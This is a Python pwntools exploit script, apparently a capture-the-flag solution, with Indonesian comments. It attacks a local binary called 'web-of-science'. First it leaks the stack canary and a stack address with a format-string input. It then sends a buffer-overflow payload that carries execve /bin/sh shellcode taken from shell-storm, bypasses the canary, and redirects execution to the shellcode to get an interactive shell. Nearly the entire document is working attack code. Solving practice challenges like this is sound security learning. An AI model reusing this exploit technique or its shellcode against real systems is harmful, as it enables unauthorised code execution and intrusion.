#!/usr/bin/python
from pwn import *

host = '127.0.0.1'
port = 1337

def exploit (r):
	# dicuri dari http://shell-storm.org/shellcode/files/shellcode-77.php
	shellcode =  '\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2'
	shellcode += '\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68'
	shellcode += '\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31'
	shellcode += '\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05'
	shellcode += '\x6a\x01\x5f\x6a\x3c\x58\x0f\x05'

	canary_offset 	= '%43$p'
	stack_offset 	= '%46$p'
	leak		= '|' + canary_offset + '|' + stack_offset + '|'

	print r.recvline ()
	r.sendline (leak)

	temp = r.recvuntil ('response:')
	temp = temp.split ('|')
	canary	= int (temp [1], 16)
	stack	= int (temp [2], 16)

	print ('Canary adalah       : {}'.format (hex (canary)))
	print ('Alamat stack adalah : {}'.format (hex (stack)))

	for x in range (0, 9):
		print ('[*] Menjawab pertanyaan no. {}'.format (x + 1))
		r.sendline (str (x))
		r.recv ()

	padding		= 'A' * (128 - len (shellcode))
	junk		= 'B' * 8
	canary_to_stack = (46 - 43) * 8 * 'C'
	buffer		= stack - 192

	payload =  shellcode + padding + junk + p64 (canary)
	payload += canary_to_stack + p64 (buffer)

	print '[+] Menyuntik payload...'
	r.sendline (payload)
	r.interactive ()
	r.close ()

if __name__ == '__main__':
	e = ELF ('./web-of-science', checksec = False)

	if len (sys.argv) > 1:
		r = remote (host, port)
		exploit (r)
	else:
		r = process ('./web-of-science')
		#gdb.attach (r)
		exploit (r)
